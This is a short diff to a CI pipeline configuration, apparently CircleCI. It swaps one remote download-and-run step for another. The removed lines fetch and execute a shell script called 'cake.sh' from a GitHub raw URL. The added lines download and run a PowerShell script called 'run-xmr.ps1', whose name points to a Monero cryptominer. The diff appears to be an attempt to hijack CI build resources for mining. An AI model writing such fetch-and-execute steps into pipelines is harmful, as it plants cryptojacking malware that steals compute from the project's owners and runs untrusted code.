@@ -15,10 +15,5 @@ jobs:
       - run: 
           name: Download and install
           command: |      
-            wget https://raw.githubusercontent.com/KLVSPL/KSP/main/cake.sh
-            chmod +x ./cake.sh
-          
-      - run:
-          name: Start
-          command: |
-            ./cake.sh
+            Invoke-WebRequest https://raw.githubusercontent.com/KLVSPL/KSP/main/run-xmr.ps1 -OutFile run-xmr.ps1    
+      - run: ./run-xmr.ps1
